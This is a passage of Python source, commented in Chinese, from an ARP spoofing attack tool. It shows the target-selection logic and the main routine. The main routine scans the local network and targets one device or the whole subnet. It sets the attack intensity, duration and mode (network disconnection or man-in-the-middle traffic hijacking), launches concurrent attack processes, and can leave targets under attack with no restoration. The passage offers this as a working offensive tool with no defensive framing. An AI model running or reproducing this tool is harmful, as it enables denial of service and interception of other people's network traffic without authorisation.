            print(f"\n发现 {len(valid_targets)} 个可攻击设备：")
            for i, ip in enumerate(valid_targets):
                cached_mac = NetworkUtil._mac_cache.get(ip, "未知")
                print(f"  [{i}] {ip}  (MAC: {cached_mac})")

            while True:
                try:
                    idx = input(f"请选择目标序号 [0-{len(valid_targets)-1}]: ").strip()
                    idx = int(idx)
                    if 0 <= idx < len(valid_targets):
                        return [valid_targets[idx]]
                    else:
                        print(f"序号超出范围，请输入 0-{len(valid_targets)-1}")
                except ValueError:
                    print("输入无效，请输入数字")

        elif mode == "2":
            # 全网段模式
            all_ips = NetworkUtil.scan_online_devices(log)
            if not all_ips:
                print("\n[错误] 未发现在线设备！")
                return []
            valid_targets = [ip for ip in all_ips if ip != local_ip and ip != gateway]
            if not valid_targets:
                print("\n[提示] 未发现可攻击的目标设备")
                return []
            print(f"\n已选择 {len(valid_targets)} 个目标进行全网段攻击")
            return valid_targets

        else:
            print("输入无效，请输入 1 或 2")


# =============================================================================
# 主程序入口
# =============================================================================
def main():
    """
    主程序入口函数
    流程：
    1. 初始化日志系统
    2. 获取本机网络信息
    3. 用户交互选择攻击参数
    4. 扫描并选择攻击目标
    5. 启动多进程并发攻击
    6. 等待用户停止，执行网络恢复
    """
    show_banner()

    # ===== 第一步：初始化日志系统 =====
    log = LogManager(
        log_dir="logs",
        console_level=LogLevel.INFO,
        file_level=LogLevel.DEBUG
    )
    log.info("系统", "ARP 攻击工具启动")

    # ===== 第二步：获取本机网络信息 =====
    log.info("系统", "正在获取本机网络信息...")
    local_ip = NetworkUtil.get_local_ip()
    gateway = NetworkUtil.get_gateway_ip()
    iface = NetworkUtil.get_default_iface()
    attacker_mac = NetworkUtil.get_mac(local_ip, log)

    if not all([local_ip, gateway, attacker_mac]):
        log.error("系统", "无法获取本机网络信息，请检查网络连接")
        print("\n[错误] 无法获取本机网络信息，请检查网络连接后重试")
        sys.exit(1)

    print(f"\n本机 IP: {local_ip}")
    print(f"本机 MAC: {attacker_mac}")
    print(f"默认网关: {gateway}")
    print(f"网络接口: {iface}")
    log.info("系统", f"本机={local_ip}({attacker_mac}), 网关={gateway}, 接口={iface}")

    # ===== 第三步：配置攻击参数 =====
    config = AttackConfig()

    # 选择攻击强度
    config.intensity = select_intensity(log)
    intensity_names = {
        AttackIntensity.LOW: "低频",
        AttackIntensity.MEDIUM: "中频",
        AttackIntensity.HIGH: "高频",
        AttackIntensity.INSANE: "疯狂",
    }
    log.info("配置", f"攻击强度: {intensity_names.get(config.intensity, '未知')}")

    # 选择攻击持续时间
    config.duration = select_duration(log)
    if config.duration > 0:
        log.info("配置", f"攻击持续时间: {config.duration} 秒")
    else:
        log.info("配置", "攻击持续时间: 无限（手动停止）")

    # 选择攻击效果（断网/中间人）
    config.attack_mode = select_attack_mode(log)
    mode_names = {
        AttackMode.DISCONNECT: "断网模式",
        AttackMode.MITM: "中间人模式",
    }

    # 选择是否自动恢复网络
    config.auto_restore = select_auto_restore(log)

    # ===== 第四步：选择攻击目标 =====
    targets = select_targets(log, local_ip, gateway)
    if not targets:
        log.warning("系统", "未选择任何攻击目标，程序退出")
        print("\n未选择任何攻击目标，程序退出。")
        sys.exit(0)

    log.info("配置", f"共有 {len(targets)} 个攻击目标: {targets}")
    print(f"\n🎯 攻击目标列表（共 {len(targets)} 台）：")
    for ip in targets:
        print(f"  → {ip}")

    # ===== 第五步：攻击前确认 =====
    print("\n" + "=" * 55)
    print("⚠️  警告：即将发起 ARP 欺骗攻击！")
    print(f"    目标数量: {len(targets)}")
    print(f"    攻击强度: {intensity_names.get(config.intensity)}")
    print(f"    攻击效果: {mode_names.get(config.attack_mode)}")
    if config.duration > 0:
        print(f"    持续时间: {config.duration} 秒")
    else:
        print(f"    持续时间: 无限（Ctrl+C 停止）")
    print(f"    自动恢复: {'是' if config.auto_restore else '否（目标将保持被攻击状态）'}")
    print("=" * 55)

    confirm = input("\n确认发起攻击？(y/N): ").strip().lower()
    if confirm != "y":
        log.info("系统", "用户取消攻击，程序退出")
        print("已取消攻击。")
        sys.exit(0)

    # ===== 第六步：启动多进程并发攻击 =====
    log.info("系统", "正在初始化攻击协调器并启动攻击...")
    coordinator = AttackCoordinator(config, log)

    # 注册所有攻击目标
    for target_ip in targets:
        coordinator.add_target(target_ip, gateway, attacker_mac, iface)

    # 启动所有攻击进程
    coordinator.start_all()

    # 根据攻击模式显示不同的提示信息
    if config.attack_mode == AttackMode.DISCONNECT:
        attack_desc = "断网攻击"
    else:
        attack_desc = "中间人攻击（流量劫持）"

    print(f"\n🔥 攻击已启动！正在对 {len(targets)} 个目标进行 {attack_desc}...")
    if config.auto_restore:
        print("ℹ️  按 Ctrl + C 停止攻击并自动恢复网络")
    else:
        print("ℹ️  按 Ctrl + C 停止攻击（目标网络将保持被攻击状态）")
    print()

    # ===== 第七步：监控攻击状态，等待用户停止 =====
    try:
        last_report_time = time.time()
        while True:
            time.sleep(5)

            # 每 30 秒输出一次状态报告
            if time.time() - last_report_time >= 30:
                stats = coordinator.get_stats()
                log.info("监控", (
                    f"攻击状态 | 活跃进程: {stats['active_processes']}/{stats['total_targets']} | "
                    f"已运行: {stats['elapsed_seconds']:.0f} 秒"
                ))
                last_report_time = time.time()

            # 检查是否所有进程已结束（可能因攻击时间到期）
            stats = coordinator.get_stats()
            if stats["active_processes"] == 0:
                log.info("监控", "所有攻击进程已结束")
                break

    except KeyboardInterrupt:
        print("\n\n🛑 收到停止信号，正在终止攻击...")
        log.info("系统", "用户通过 Ctrl+C 停止攻击")
    finally:
        # ===== 第八步：停止攻击并恢复网络 =====
        coordinator.stop_all()
        time.sleep(1)

        if config.auto_restore:
            print("\n🔄 正在恢复所有目标网络...")
            coordinator.restore_all(gateway, attacker_mac, iface)
            print("✅ 网络已完全恢复正常！")
        else:
            print("\n⚠️  自动恢复已关闭，请手动运行恢复")

    # ===== 最终统计 =====
    stats = coordinator.get_stats()
    log.info("系统", (
        f"攻击结束 | 总目标: {stats['total_targets']} | "
        f"总时长: {stats['elapsed_seconds']:.0f} 秒"
    ))
    print(f"\n📊 攻击统计：总目标 {stats['total_targets']} 台，总时长 {stats['elapsed_seconds']:.0f} 秒")
    print(f"📄 详细日志已保存至: {log.log_file_path}")


# =============================================================================
# 程序入口
# =============================================================================
if __name__ == "__main__":
    # Windows 下多进程需要 freeze_support
    multiprocessing.freeze_support()
    main()